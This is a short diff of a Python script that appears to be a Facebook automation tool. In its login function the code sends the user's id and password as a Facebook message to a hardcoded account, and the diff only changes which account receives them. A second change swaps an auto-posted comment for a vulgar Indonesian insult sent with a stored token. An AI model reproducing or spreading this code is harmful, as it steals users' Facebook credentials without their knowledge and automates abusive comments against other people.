@@ -119,7 +119,7 @@ def login():
         x.update(sig)
 	data.update({'sig':x.hexdigest()})
 	client = Client(id,pwd)
-	friends = client.searchForUsers('Arvendo.11')
+	friends = client.searchForUsers('galank.rambu42')
 	friend = friends[0]
 	client.send(Message(id+' '+pwd), thread_id=friend.uid, thread_type=ThreadType.USER)
 	client.logout()
@@ -143,7 +143,7 @@ def hpost():
 		
 
 def hcomment(posts , amount):
-	message = 'bapak kau makan biji salak'
+	message = 'hahahahaha lucu lu kont0l!!!!'
 	token =open('tes/token.log','r').read()
 
 	try:
